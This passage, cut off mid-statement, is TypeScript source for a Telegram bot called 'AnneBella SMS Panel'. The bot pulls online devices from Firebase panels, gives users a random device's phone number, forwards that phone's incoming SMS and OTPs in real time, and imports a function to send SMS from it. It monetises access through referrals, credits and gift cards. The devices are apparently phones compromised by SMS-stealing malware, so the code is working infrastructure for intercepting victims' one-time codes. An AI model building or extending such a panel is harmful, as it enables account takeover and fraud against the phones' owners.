import TelegramBot from "node-telegram-bot-api";
import { db, botUsersTable, panelsTable, giftCardsTable, referralsTable } from "@workspace/db";
import { eq, and } from "drizzle-orm";
import { fetchPanelDevices, fetchDeviceSms, sendSmsViaFirebase, extractPhoneFromSms } from "./firebase";
import * as fs from "fs";
import * as path from "path";
import { logger } from "./logger";

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const BOT_USERNAME  = process.env.BOT_USERNAME  || "AnneBella_Sms_Panel_Bot";
const DEVELOPER     = "@annebella";

// Required channels — order determines 2×2 grid layout
const REQUIRED_CHANNELS = [
  { id: "@indiagates",         label: "ᴀɴɴᴇʙᴇʟʟᴀ ɴᴇᴛᴡᴏʀᴋ", url: "https://t.me/indiagates"         },
  { id: "@annebellapanel",     label: "ᴘᴀɴᴇʟ ᴜᴘᴅᴀᴛᴇ",        url: "https://t.me/annebellapanel"     },
  { id: "@AnnebellaStorechat", label: "ꜱᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ",        url: "https://t.me/AnnebellaStorechat" },
  { id: "@AnneBellaForums",    label: "ꜰᴏʀᴜᴍ",                url: "https://t.me/AnneBellaForums"    },
];

let bot: TelegramBot | null = null;

export function getBot(): TelegramBot | null {
  return bot;
}

export function initBot(useWebhook = false): TelegramBot {
  if (bot) return bot;
  if (!BOT_TOKEN) {
    logger.error("TELEGRAM_BOT_TOKEN not set");
    throw new Error("TELEGRAM_BOT_TOKEN is required");
  }
  if (useWebhook) {
    bot = new TelegramBot(BOT_TOKEN, { webHook: false });
  } else {
    bot = new TelegramBot(BOT_TOKEN, { polling: true });
    logger.info("Telegram bot started with polling");
    setupHandlers(bot);
  }
  return bot;
}

export function processUpdate(update: TelegramBot.Update): void {
  if (!bot) return;
  bot.processUpdate(update);
}

// ─── Premium Emoji IDs ────────────────────────────────────────────────────────
const E = {
  lightning:    "5355051922862653659",   // ⚡
  sparkle:      "5289722755871162900",   // ✨
  rocket:       "5372917041193828849",   // 🚀
  search:       "5368309348739074032",   // 🔎
  signal:       "5352759161945867747",   // (back arrow — used for BACK button)
  a1:           "5445033158456145975",   // new #1 (status)
  buy2:         "5445353829304387411",   // new (buy credit)
  a2:           "5104966345267610825",   // new #2
  a3:           "4918014360267260850",   // new #3
  a4:           "4915842446845281363",   // new #4
  a5:           "4916086774649848789",   // new #5
  profile2:     "5269531045165816230",   // profile button
  search2:      "5893382531037794941",   // search number button
  globe:        "5372849966689566579",   // 🌐
  profile:      "5206318837489743801",   // 👤
  gift:         "5359664288241829619",   // 🎁
  coin:         "5334998226636390258",   // 🪙
  back:         "5330237710655306682",   // ↩️
  newnum:       "5319160079465857105",   // 🆕
  eye:          "6206155797722830770",   // 👁
  history:      "6206497372176913599",   // 📋
  stop:         "5332296662142434561",   // 🛑  (verified from adsbot)
  home:         "6204010762206189094",   // 🏠
  check:        "6206479140040743133",   // ✅  (verified from adsbot)
  lock:         "6206404510689007446",   // 🔒
  fire:         "6206080502651164081",   // 🔥
  star:         "6204162490515855272",   // ⭐
  phone:        "6206446249181189526",   // 📱
  crown:        "6206343625232619150",   // 👑
  money:        "6206378324273403309",   // 💰
  note:         "6206108815075579644",   // 🎵
  warn:         "6206174450765796040",   // ⚠️  (verified from adsbot)
  trophy:       "6203750195130274981",   // 🏆
  link:         "5339286072876614251",   // 🔗  (verified from adsbot)
  support:      "6026056450223116307",   // 🖥️
  buy:          "5395358455768837479",   // 💳
  panel:        "6035152649790164056",   // 🖥️
  tick:         "5863980370340351884",   // ✔️
  id:           "5404561694510833322",   // 🆔
  name:         "5190806721286657692",   // 📛
  joined:       "5195033767969839232",   // 📅
  expire:       "5312361253610475399",   // ⌛
  referral:     "5197269100878907942",   // 👥
  credits:      "5253742260054409879",   // 💎
  online:       "5440621591387980068",   // 🟢
  offline:      "5294048127240655242",   // 🔴
  battery:      "5291933173674957761",   // 🔋
  sim:          "6269085886177087845",   // 📲
  random:       "6017187377116614559",   // 🎲
  status_ok:    "6019476152303750898",   // 🔵
  wave:         "5247133031235329609",   // 〰️
  key:          "5249273776079640466",   // 🔑
  timer:        "5246842176050046092",   // ⏱️
  total:        "5246772116543512028",   // 📊
  device:       "5237761614458933049",   // 📟
  db:           "5235588635885054955",   // 🗄️
  sms:          "5453900977432188793",   // 💬  (verified from adsbot; 5258500422393415126=📲)
  refresh:      "5339233635620899144",   // 🔄  (verified from adsbot; 5301096984617166561=💵)
};

// Unicode fallback for every entry in E — shown to non-Premium users
const E_FB: Record<string, string> = {
  "5355051922862653659": "⚡",
  "5289722755871162900": "✨",
  "5372917041193828849": "🚀",
  "5368309348739074032": "🔎",
  "5352759161945867747": "📶",
  "5372849966689566579": "🌐",
  "5206318837489743801": "👤",
  "5359664288241829619": "🎁",
  "5334998226636390258": "🪙",
  "5330237710655306682": "↩️",
  "5319160079465857105": "🆕",
  "6206155797722830770": "👁",
  "6206497372176913599": "📋",
  "6206479140040743133": "✅",
  "6204010762206189094": "🏠",
  "6206188632747808299": "✦",  // old check ID — kept for safety
  "5332296662142434561": "🛑",  // correct stop/🛑
  "6206404510689007446": "🔒",
  "6206080502651164081": "🔥",
  "6204162490515855272": "⭐",
  "6206446249181189526": "📱",
  "6206343625232619150": "👑",
  "6206378324273403309": "💰",
  "6206108815075579644": "🎵",
  "6206110936789423908": "⚠️",  // old warn ID
  "6206174450765796040": "⚠️",  // correct warn
  "6203750195130274981": "🏆",
  "6025878226260202192": "🔗",  // old link ID
  "5339286072876614251": "🔗",  // correct link
  "6026056450223116307": "🖥️",
  "5395358455768837479": "💳",
  "6035152649790164056": "🖥️",
  "5863980370340351884": "✔️",
  "5404561694510833322": "🆔",
  "5190806721286657692": "📛",
  "5195033767969839232": "📅",
  "5312361253610475399": "⌛",
  "5197269100878907942": "👥",
  "5253742260054409879": "💎",
  "5440621591387980068": "🟢",
  "5294048127240655242": "🔴",
  "5291933173674957761": "🔋",
  "6269085886177087845": "📲",
  "6017187377116614559": "🎲",
  "6019476152303750898": "🔵",
  "5247133031235329609": "〰️",
  "5249273776079640466": "🔑",
  "5246842176050046092": "⏱️",
  "5246772116543512028": "📊",
  "5237761614458933049": "📟",
  "5235588635885054955": "🗄️",
  "5258500422393415126": "📲",  // this is actually 📲
  "5453900977432188793": "💬",  // correct sms/💬
  "5301096984617166561": "💵",  // this is actually 💵
  "5339233635620899144": "🔄",  // correct refresh/🔄
  "5445033158456145975": "✦",
  "5445353829304387411": "✦",
  "5269531045165816230": "✦",
  "5893382531037794941": "✦",
  "5104966345267610825": "✦",
  "4918014360267260850": "✦",
  "4915842446845281363": "✦",
  "4916086774649848789": "✦",
};

// Premium emoji tag for HTML parse mode.
// Premium users → animated custom emoji sticker.
// Non-premium users → Unicode fallback from E_FB (never blank).
// Pass an explicit non-empty fallback to override the auto-lookup.
function em(id: string, fallback: string): string {
  const fb = fallback !== "" ? fallback : (E_FB[id] ?? "•");
  return `<tg-emoji emoji-id="${id}">${fb}</tg-emoji>`;
}

// ─── Small Caps ───────────────────────────────────────────────────────────────
// Converts uppercase A-Z to Unicode small caps. HTML-aware: skips text inside
// <tags> so HTML markup and emoji-ids are never corrupted.
const SC_MAP: Record<string, string> = {
  A:"ᴀ", B:"ʙ", C:"ᴄ", D:"ᴅ", E:"ᴇ", F:"ꜰ", G:"ɢ", H:"ʜ", I:"ɪ",
  J:"ᴊ", K:"ᴋ", L:"ʟ", M:"ᴍ", N:"ɴ", O:"ᴏ", P:"ᴘ", Q:"ǫ", R:"ʀ",
  S:"ꜱ", T:"ᴛ", U:"ᴜ", V:"ᴠ", W:"ᴡ", X:"x",  Y:"ʏ", Z:"ᴢ",
};

// HTML-aware small caps: skips content inside < > angle brackets
function sc(html: string): string {
  let out = "";
  let inTag = false;
  for (let i = 0; i < html.length; i++) {
    const c = html[i];
    if (c === "<")       { inTag = true;  out += c; }
    else if (c === ">")  { inTag = false; out += c; }
    else if (inTag)      { out += c; }
    else                 { out += SC_MAP[c] ?? c; }
  }
  return out;
}

// Plain-text small caps (for button text — no HTML)
function sct(text: string): string {
  return text.split("").map(c => SC_MAP[c] ?? c).join("");
}

// ─── Keyboards ────────────────────────────────────────────────────────────────
// Telegram Bot API fields on KeyboardButton:
//   style: "success" (green) | "danger" (red) | "primary" (blue)
//   icon_custom_emoji_id: premium emoji ID shown BEFORE the button text

type KBtn = TelegramBot.KeyboardButton & {
  style?: "success" | "danger" | "primary";
  icon_custom_emoji_id?: string;
};
type KRow = KBtn[];
type CKeyboard = { keyboard: KRow[]; resize_keyboard: boolean; is_persistent?: boolean };

function btn(
  text: string,
  style: "success" | "danger" | "primary",
  emojiId?: string
): KBtn {
  return emojiId
    ? { text: sct(text), style, icon_custom_emoji_id: emojiId }
    : { text: sct(text), style };
}

function mainMenuKeyboard(): CKeyboard {
  return {
    keyboard: [
      [
        btn("GET NUMBER",            "success", E.a2),         // 5104966345267610825
        btn("WEB PANEL",             "primary", E.sparkle),   // new #6 ✨
      ],
      [
        btn("SUPPORT ( DEVELOPER )", "danger",  E.support),   // 🖥
      ],
      [
        btn("SEARCH NUMBER",         "primary", E.search2),   // 5893382531037794941
        btn("BUY CREDIT",            "success", E.buy2),      // new buy ID
      ],
      [
        btn("STATUS",                "primary", E.name),      // 5190806721286657692
        btn("PROFILE",               "primary", E.profile2),  // 5269531045165816230
      ],
      [
        btn("GIFT CARD",             "success", E.a5),        // new #5
        btn("REFER & EARN",          "success", E.referral),  // 👥
      ],
      [
        btn("BACK",                  "danger",  E.signal),    // user's back ID
      ],
    ],
    resize_keyboard: true,
    is_persistent: true,
  };
}

function numberMenuKeyboard(): CKeyboard {
  return {
    keyboard: [
      [
        btn("NEW NUMBER",      "success", E.a2),         // new #2
        btn("WATCH SMS",       "success", E.eye),        // 👁
      ],
      [
        btn("SMS HISTORY",     "primary", E.history),    // 📋
        btn("STOP WATCH",      "danger",  E.stop),       // 🛑
      ],
      [
        btn("SEND SMS",        "primary", E.a3),         // new #3
        btn("NUMBERS HISTORY", "primary", E.a4),         // new #4
      ],
      [
        btn("BACK",            "danger",  E.signal),     // user's back ID
      ],
    ],
    resize_keyboard: true,
    is_persistent: true,
  };
}

function watchMenuKeyboard(): CKeyboard {
  return {
    keyboard: [
      [
        btn("STOP WATCH",  "danger",  E.stop),     // 🛑
        btn("SMS HISTORY", "primary", E.history), // 📋
      ],
      [
        btn("BACK",        "danger",  E.signal),  // user's back ID
      ],
    ],
    resize_keyboard: true,
    is_persistent: true,
  };
}

function cancelKeyboard(): CKeyboard {
  return {
    keyboard: [
      [ btn("CANCEL", "danger", E.stop) ],  // 🛑
    ],
    resize_keyboard: true,
    is_persistent: true,
  };
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

function divider(): string {
  return "〰️〰️〰️〰️〰️〰️〰️〰️〰️〰️";
}

function generateReferralCode(telegramId: string): string {
 return `ref_${telegramId}`;
}

async function getOrCreateUser(msg: TelegramBot.Message, referredBy?: string | null) {
  const telegramId = String(msg.from!.id);
  const [existing] = await db
    .select()
    .from(botUsersTable)
    .where(eq(botUsersTable.telegramId, telegramId));

  if (existing) return existing;

  const expiresAt = new Date(Date.now() + 60 * 60 * 1000);
  const [user] = await db
    .insert(botUsersTable)
    .values({
      telegramId,
      username: msg.from?.username || null,
      firstName: msg.from?.first_name || "User",
      referralCode: generateReferralCode(telegramId),
      referredBy: referredBy || null,
      getNumberExpiresAt: expiresAt,
    })
    .returning();

  if (referredBy) {
    const [referrer] = await db
      .select()
      .from(botUsersTable)
      .where(eq(botUsersTable.referralCode, referredBy));

    if (referrer) {
      const newCount = referrer.referralCount + 1;
      const now = new Date();

      const currentExpiry = referrer.getNumberExpiresAt
        ? new Date(Math.max(referrer.getNumberExpiresAt.getTime(), now.getTime()))
        : now;
      const newExpiry = new Date(currentExpiry.getTime() + 12 * 60 * 60 * 1000);

      const sendSmsUnlocked = newCount >= 10 ? true : referrer.sendSmsUnlocked;
      const newSmsCredits =
        newCount >= 10 && !referrer.sendSmsUnlocked
          ? referrer.smsCredits + 500
          : newCount > 10
          ? referrer.smsCredits + 100
          : referrer.smsCredits;

      let webPanelExpiry = referrer.webPanelExpiresAt;
      if (newCount === 10) {
        const webBase = webPanelExpiry
          ? new Date(Math.max(webPanelExpiry.getTime(), now.getTime()))
          : now;
        webPanelExpiry = new Date(webBase.getTime() + 24 * 60 * 60 * 1000);
      } else if (newCount > 10 && webPanelExpiry) {
        const webBase = new Date(Math.max(webPanelExpiry.getTime(), now.getTime()));
        webPanelExpiry = new Date(webBase.getTime() + 12 * 60 * 60 * 1000);
      }

      await db
        .update(botUsersTable)
        .set({ referralCount: newCount, getNumberExpiresAt: newExpiry, sendSmsUnlocked, smsCredits: newSmsCredits, webPanelExpiresAt: webPanelExpiry })
        .where(eq(botUsersTable.id, referrer.id));

      await db.insert(referralsTable).values({ referrerId: referrer.id, referredTelegramId: telegramId });
    }
  }

  return user;
}

async function hasGetNumberAccess(user: { getNumberExpiresAt: Date | null }): Promise<boolean> {
  if (!user.getNumberExpiresAt) return false;
  return user.getNumberExpiresAt > new Date();
}

// Check which channels the user has joined (requires bot to be admin in channels)
async function checkMembership(bot: TelegramBot, telegramId: string): Promise<boolean[]> {
  return Promise.all(
    REQUIRED_CHANNELS.map(async (ch) => {
      try {
        const m = await bot.getChatMember(ch.id, parseInt(telegramId));
        return ["member", "administrator", "creator"].includes(m.status);
      } catch {
        return false; // channel not accessible or user not found
      }
    })
  );
}

// ─── Raw Telegram HTTP request (bypasses node-telegram-bot-api) ──────────────
// Needed because node-telegram-bot-api strips unknown fields like
// icon_custom_emoji_id on InlineKeyboardButton.  We hit the Bot API directly.
async function rawTelegramRequest(method: string, payload: Record<string, any>): Promise<any> {
  const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
    method:  "POST",
    headers: { "Content-Type": "application/json" },
    body:    JSON.stringify(payload),
  });
  return res.json();
}

// Remove icon_custom_emoji_id / style from all buttons (fallback when Telegram rejects them)
function stripKeyboardIcons(payload: Record<string, any>): Record<string, any> {
  const p = JSON.parse(JSON.stringify(payload));
  const rm = p.reply_markup;
  if (rm?.inline_keyboard) {
    for (const row of rm.inline_keyboard)
      for (const b of row) { delete b.icon_custom_emoji_id; delete b.style; }
  }
  return p;
}

// ─── Inline button with premium emoji via icon_custom_emoji_id (Adsbot style) ─
// Same field as ReplyKeyboardButton — works on InlineKeyboardButton too when
// sent via raw HTTP.  Button text is clean small-caps only; icon appears left.
function iBtn(opts: {
  label:   string;
  emojiId: string;
  url?:    string;
  cb?:     string;
  style?:  "success" | "danger" | "primary";
}): any {
  const btn: any = {
    text:                opts.label,
    style:               opts.style ?? "success",
    icon_custom_emoji_id: opts.emojiId,
  };
  if (opts.url) btn.url           = opts.url;
  if (opts.cb)  btn.callback_data  = opts.cb;
  return btn;
}

// Build 2×2 inline channel keyboard with join status + premium emoji
function buildChannelKeyboard(joined: boolean[], allJoined: boolean): { inline_keyboard: any[][] } {
  const rows: any[][] = [];
  for (let i = 0; i < REQUIRED_CHANNELS.length; i += 2) {
    const row: any[] = [];
    for (let j = i; j < Math.min(i + 2, REQUIRED_CHANNELS.length); j++) {
      const ch = REQUIRED_CHANNELS[j];
      const ok = joined[j];
      row.push(iBtn({
        label:   ch.label,
        emojiId: ok ? E.check : E.link,
        url:     ch.url,
        style:   ok ? "success" : "primary",
      }));
    }
    rows.push(row);
  }

  // "I JOINED" / "ALL JOINED" — blue primary
  rows.push([iBtn({
    label:   allJoined ? "ᴀʟʟ ᴊᴏɪɴᴇᴅ — ᴇɴᴛᴇʀ ʙᴏᴛ" : "ɪ ᴊᴏɪɴᴇᴅ — ᴄʜᴇᴄᴋ ɴᴏᴡ",
    emojiId: allJoined ? E.rocket : E.check,
    cb:      "check_joined",
    style:   "primary",
  })]);
  return { inline_keyboard: rows };
}

// ─── Numbers History (file-based, like PHP bot) ───────────────────────────────
interface NumberHistoryEntry {
  deviceId: string;
  phoneNumber: string;
  deviceName: string;
  panelId: number;
  panelName: string;
  takenAt: number; // epoch ms
}

const HISTORY_FILE = path.join(process.cwd(), "numbers-history.json");

function loadNumbersHistory(): Record<string, NumberHistoryEntry[]> {
  try {
    if (fs.existsSync(HISTORY_FILE)) {
      return JSON.parse(fs.readFileSync(HISTORY_FILE, "utf8"));
    }
  } catch { /* ignore */ }
  return {};
}

function saveNumbersHistory(data: Record<string, NumberHistoryEntry[]>) {
  try { fs.writeFileSync(HISTORY_FILE, JSON.stringify(data, null, 2)); } catch { /* ignore */ }
}

function addToNumbersHistory(telegramId: string, entry: NumberHistoryEntry) {
  const data = loadNumbersHistory();
  if (!data[telegramId]) data[telegramId] = [];
  // Avoid exact duplicate (same deviceId taken within last 5 mins)
  const recent = data[telegramId].find(
    h => h.deviceId === entry.deviceId && Date.now() - h.takenAt < 5 * 60 * 1000
  );
  if (!recent) {
    data[telegramId].unshift(entry); // newest first
    if (data[telegramId].length > 20) data[telegramId] = data[telegramId].slice(0, 20);
    saveNumbersHistory(data);
  }
}

// Active devices = online (status true) AND lastSeen within last 1 hour
// If lastSeenTs is null, trust the status field (some apps don't report timestamp)
async function getAllActiveDevices() {
  const panels = await db.select().from(panelsTable);
  const all = [];
  const oneHourAgo = Date.now() - 60 * 60 * 1000;
  for (const panel of panels) {
    const devices = await fetchPanelDevices(panel.firebaseUrl, panel.secretKey, panel.id, panel.name);
    const active = devices.filter(d => {
      if (!d.status) return false;
      if (d.lastSeenTs !== null) return d.lastSeenTs >= oneHourAgo;
      return true; // no timestamp → trust status
    });
    all.push(...active);
  }
  return all;
}

// Watch polling: userId → intervalId
const watchIntervals = new Map<string, NodeJS.Timeout>();
const watchLastSms   = new Map<string, string>();

// ─── Handlers ─────────────────────────────────────────────────────────────────

function setupHandlers(bot: TelegramBot) {
  // Auto-applies sc() small-caps + defaults parse_mode to HTML.
  // When an inline keyboard is present, sends via raw HTTP so that
  // icon_custom_emoji_id on InlineKeyboardButton is preserved
  // (node-telegram-bot-api strips unknown fields during serialisation).
  const send = async (cid: number, html: string, opts: Record<string, any> = {}) => {
    const rm = opts.reply_markup;
    const hasInline = rm && typeof rm === "object" && "inline_keyboard" in rm;
    if (hasInline) {
      const payload: Record<string, any> = {
        chat_id:      cid,
        text:         sc(html),
        parse_mode:   "HTML",
        reply_markup: rm,
      };
      // carry through any extra opts (disable_web_page_preview etc.)
      for (const [k, v] of Object.entries(opts)) {
        if (k !== "reply_markup" && k !== "parse_mode") payload[k] = v;
      }
      const result = await rawTelegramRequest("sendMessage", payload);
      // If Telegram rejects (e.g. icon not supported), retry without icons
      if (!result.ok) {
        return rawTelegramRequest("sendMessage", stripKeyboardIcons(payload));
      }
      return result;
    }
    return bot.sendMessage(cid, sc(html), { parse_mode: "HTML", ...opts });
  };

  bot.on("message", async (msg) => {
    if (!msg.from || !msg.text) return;
    const chatId     = msg.chat.id;
    const text       = msg.text.trim();
    const telegramId = String(msg.from.id);

    try {
      // ── /start ──────────────────────────────────────────────────────────
      if (text.startsWith("/start")) {
        const param      = text.split(" ")[1] || null;
        const referredBy = param?.startsWith("ref_") ? param : null;
        const user       = await getOrCreateUser(msg, referredBy);

        // Welcome message with premium emoji
        await send(
          chatId,
          `${em(E.sparkle, "")} <b>ANNEBELLA SMS PANEL</b> ${em(E.sparkle, "")}\n` +
          `${divider()}\n\n` +
 `${em(E.sparkle, "")} <b>WELCOME TO ANNEBELLA SMS PANEL!</b>\n\n` +
 `${em(E.lightning, "")}${em(E.lightning, "")} <b>AAPKO 1 GHANTE KE LIYE GET NUMBER FREE MILA!</b>\n` +
 `KOI LIMIT NAHI — 1HR TAK FULL ACCESS.\n\n` +
 `${em(E.expire, "")} 1HR KE BAAD GET NUMBER LOCK HO JAYEGA.\n` +
 `${em(E.coin, "")} REFER KARO AUR EXTRA HOURS PAO!`,
          { parse_mode: "HTML", reply_markup: { remove_keyboard: true } }
        );

        // Check which channels user has already joined
        const joined    = await checkMembership(bot, telegramId);
        const joinCount = joined.filter(Boolean).length;
        const total     = REQUIRED_CHANNELS.length;
        const allJoined = joinCount === total;

        if (allJoined) {
          // Skip verification — go straight to main menu
          await send(
            chatId,
 `${em(E.check, "")} <b>ᴀʟʟ ᴄʜᴀɴɴᴇʟꜱ ᴠᴇʀɪꜰɪᴇᴅ</b>\n${divider()}\n\n` +
            `ANNEBELLA SMS PANEL MEIN AAPKA SWAGAT HAI.\n` +
            `${em(E.rocket, "")} ᴀᴄᴄᴇꜱꜱ ᴀʙ ᴜɴʟᴏᴄᴋ ʜᴀɪ.`,
            { parse_mode: "HTML", reply_markup: buildChannelKeyboard(joined, true) }
          );
          await send(
            chatId,
 `${em(E.lightning, "")} <b>ʙᴏᴛ ʀᴇᴀᴅʏ! ᴜꜱᴇ ᴛʜᴇ ʙᴜᴛᴛᴏɴꜱ ʙᴇʟᴏᴡ.</b>`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
        } else {
          await send(
            chatId,
 `${em(E.lock, "")} <b>ᴄʜᴀɴɴᴇʟ ᴠᴇʀɪꜰɪᴄᴀᴛɪᴏɴ ʀᴇǫᴜɪʀᴇᴅ</b>\n${divider()}\n\n` +
            `ANNEBELLA SMS PANEL KA FULL ACCESS PANE KE LIYE\nNICHE DIYE GAYE SABHI OFFICIAL CHANNELS JOIN KARO.\n\n` +
            `${em(E.globe, "")} <b>ᴘʀᴏɢʀᴇꜱꜱ: ${joinCount}/${total} ᴊᴏɪɴᴇᴅ</b>\n\n` +
            `CHANNELS JOIN KARNE KE BAAD <b>ɪ ᴊᴏɪɴᴇᴅ — ᴄʜᴇᴄᴋ ɴᴏᴡ</b> BUTTON DABAO.`,
            { parse_mode: "HTML", reply_markup: buildChannelKeyboard(joined, false) }
          );
        }
        return;
      }

      // ── Fetch user ───────────────────────────────────────────────────────
      const [user] = await db
        .select()
        .from(botUsersTable)
        .where(eq(botUsersTable.telegramId, telegramId));

      if (!user) {
        await send(chatId, "PLEASE SEND /start TO BEGIN.");
        return;
      }

      // ── Main menu navigation ─────────────────────────────────────────────

      if (text === sct("GET NUMBER")) {
        const hasAccess = await hasGetNumberAccess(user);
        if (!hasAccess) {
          await send(
            chatId,
 `${em(E.expire, "")} <b>GET NUMBER ACCESS EXPIRED!</b>\n\n` +
            `ACCESS KHATAM HO GAYA.\n` +
            `${em(E.coin, "")} HAR REFERRAL = +12HR ACCESS\n\n` +
            `REFER & EARN DABAO AUR LINK SHARE KARO.`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        await send(
          chatId,
 `${em(E.lightning, "")} <b>GENERATING A RANDOM NUMBER...</b>`,
          { parse_mode: "HTML" }
        );

        const activeDevices = await getAllActiveDevices();
        if (activeDevices.length === 0) {
          await send(
            chatId,
 `${em(E.offline, "")} <b>NO ACTIVE NUMBERS RIGHT NOW!</b>\n\n` +
            `${em(E.refresh, "")} THODI DER BAAD DOBARA TRY KARO — NUMBERS REGULARLY ACTIVE HOTE HAIN.`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        const device = activeDevices[Math.floor(Math.random() * activeDevices.length)];

        await db
          .update(botUsersTable)
          .set({ assignedDeviceId: device.id, assignedPanelId: device.panelId, state: "number_menu" })
          .where(eq(botUsersTable.id, user.id));

        // Fetch SMS to extract real phone number (device node rarely has phoneNumber)
        const [devicePanel] = await db.select().from(panelsTable).where(eq(panelsTable.id, device.panelId));
        let resolvedPhone = device.phoneNumber && device.phoneNumber !== "—" ? device.phoneNumber : null;
        if (!resolvedPhone && devicePanel) {
          const smsForPhone = await fetchDeviceSms(devicePanel.firebaseUrl, devicePanel.secretKey, device.id);
          resolvedPhone = extractPhoneFromSms(smsForPhone);
        }
        const displayPhone = resolvedPhone || "—";

        // Save to numbers history
        addToNumbersHistory(telegramId, {
          deviceId: device.id,
          phoneNumber: displayPhone,
          deviceName: device.name || device.model || device.id,
          panelId: device.panelId,
          panelName: device.panelName,
          takenAt: Date.now(),
        });

        const remainingMs  = user.getNumberExpiresAt ? Math.max(0, user.getNumberExpiresAt.getTime() - Date.now()) : 0;
        const remainingMin = Math.floor(remainingMs / 60000);

        await send(
          chatId,
 `${em(E.lightning, "")} <b>RANDOM NUMBER GENERATED!</b>\n` +
          `${divider()}\n\n` +
          `${em(E.id, "")} <b>DEVICE ID</b>    : N${device.id}\n` +
          `${em(E.phone, "")} <b>NUMBER</b>      : ${displayPhone}\n` +
          `${em(E.profile, "")} <b>DEVICE NAME</b> : ${device.name || device.model || device.id}\n` +
          `${em(E.db, "")} <b>DATABASE</b>    : ${device.panelName}\n` +
          `${em(E.check, "")} <b>STATUS</b>      : ${em(E.online, "")} ONLINE\n` +
          `${em(E.battery, "")} <b>BATTERY</b>     : ${device.battery || "—"}\n` +
          `${divider()}\n\n` +
          `${em(E.timer, "")} ACCESS — ${remainingMin}m REMAINING\n` +
          `${em(E.history, "")} NUMBERS HISTORY MEIN SAVED — ANYTIME DEKHO.`,
          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("NEW NUMBER")) {
        const hasAccess = await hasGetNumberAccess(user);
        if (!hasAccess) {
          await send(
            chatId,
 `${em(E.expire, "")} <b>ACCESS EXPIRED!</b> REFER KARKE ACCESS BADHAO.`,
            { parse_mode: "HTML", reply_markup: mainMenuKeyboard() as any }
          );
          return;
        }

        await send(
          chatId,
 `${em(E.lightning, "")} <b>GENERATING A RANDOM NUMBER...</b>`,
          { parse_mode: "HTML" }
        );

        const activeDevices2 = await getAllActiveDevices();
        if (activeDevices2.length === 0) {
          await send(
            chatId,
 `${em(E.offline, "")} <b>NO ACTIVE NUMBERS RIGHT NOW!</b>\n\n` +
            `${em(E.refresh, "")} THODI DER BAAD DOBARA TRY KARO.`,
            { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
          );
          return;
        }

        const device2 = activeDevices2[Math.floor(Math.random() * activeDevices2.length)];

        await db
          .update(botUsersTable)
          .set({ assignedDeviceId: device2.id, assignedPanelId: device2.panelId })
          .where(eq(botUsersTable.id, user.id));

        // Fetch SMS to extract real phone number
        const [devicePanel2] = await db.select().from(panelsTable).where(eq(panelsTable.id, device2.panelId));
        let resolvedPhone2 = device2.phoneNumber && device2.phoneNumber !== "—" ? device2.phoneNumber : null;
        if (!resolvedPhone2 && devicePanel2) {
          const smsForPhone2 = await fetchDeviceSms(devicePanel2.firebaseUrl, devicePanel2.secretKey, device2.id);
          resolvedPhone2 = extractPhoneFromSms(smsForPhone2);
        }
        const displayPhone2 = resolvedPhone2 || "—";

        // Save to numbers history
        addToNumbersHistory(telegramId, {
          deviceId: device2.id,
          phoneNumber: displayPhone2,
          deviceName: device2.name || device2.model || device2.id,
          panelId: device2.panelId,
          panelName: device2.panelName,
          takenAt: Date.now(),
        });

        const remainingMs2  = user.getNumberExpiresAt ? Math.max(0, user.getNumberExpiresAt.getTime() - Date.now()) : 0;
        const remainingMin2 = Math.floor(remainingMs2 / 60000);

        await send(
          chatId,
 `${em(E.lightning, "")} <b>RANDOM NUMBER GENERATED!</b>\n` +
          `${divider()}\n\n` +
          `${em(E.id, "")} <b>DEVICE ID</b>    : N${device2.id}\n` +
          `${em(E.phone, "")} <b>NUMBER</b>      : ${displayPhone2}\n` +
          `${em(E.profile, "")} <b>DEVICE NAME</b> : ${device2.name || device2.model || device2.id}\n` +
          `${em(E.db, "")} <b>DATABASE</b>    : ${device2.panelName}\n` +
          `${em(E.check, "")} <b>STATUS</b>      : ${em(E.online, "")} ONLINE\n` +
          `${em(E.battery, "")} <b>BATTERY</b>     : ${device2.battery || "—"}\n` +
          `${divider()}\n\n` +
          `${em(E.timer, "")} ACCESS — ${remainingMin2}m REMAINING\n` +
          `${em(E.history, "")} NUMBERS HISTORY MEIN SAVED — ANYTIME DEKHO.`,
          { parse_mode: "HTML", reply_markup: numberMenuKeyboard() as any }
        );
        return;
      }

      if (text === sct("WATCH SMS")) {
        if (!user.assignedDeviceId || !user.assignedPanelId) {
          await send(chatId, "FIRST GET NUMBER DABAO.", { reply_markup: mainMenuKeyboard() as any });
          return;
        }

        const [panel] = await db.select().from(panelsTable).where(eq(panelsTable.id, user.assignedPanelId));
        if (!panel) {
          await send(chatId, "PANEL NOT FOUND.", { reply_markup: mainMenuKeyboard() as any });
          return;
        }

        const existing = watchIntervals.get(telegramId);
        if (existing) clearInterval(existing);

        // Get phone number from history to show in watch message
        const histData = loadNumbersHistory();
        const lastEntry = histData[telegramId]?.find(h => h.deviceId === user.assignedDeviceId);
        const watchPhone = lastEntry?.phoneNumber || user.assignedDeviceId;

        await send(
          chatId,
 `${em(E.eye, "")} <b>WATCHING FOR OTPS...</b>\n` +
          `${divider()}\n\n` +
          `${em(E.phone, "")} <b>NUMBER:</b> <code>${watchPhone}</code>\n\n` +
          `${em(E.lightning, "")} NEW OTP/SMS REAL-TIME FORWARD HOGA.\n` +
          `${em(E.warn, "")} WATCH CHAL RAHA HAI — HAR 10 SECONDS MEIN CHECK.\n\n` +
          `${em(E.stop, "")} TAP <b>STOP WATCH</b> TO STOP.`,
          { parse_mode: "HTML", reply_markup: watchMenuKeyboard() as any }
        );

        const intervalId = setInterval(async () => {
          try {
            const msgs = await fetchDeviceSms(panel.firebaseUrl, panel.secretKey, user.assignedDeviceId!);
            if (msgs.length === 0) return;
            const latest = msgs[0];
            const key = `${latest.sender}:${latest.text}:${latest.time}`;
            if (key !== watchLastSms.get(telegramId)) {
              watchLastSms.set(telegramId, key);
              const otp = latest.text.match(/\b\d{4,8}\b/)?.[0];
              await send(
                chatId,
 `${em(E.sms, "")} <b>LIVE SMS RECEIVED!</b>\n` +
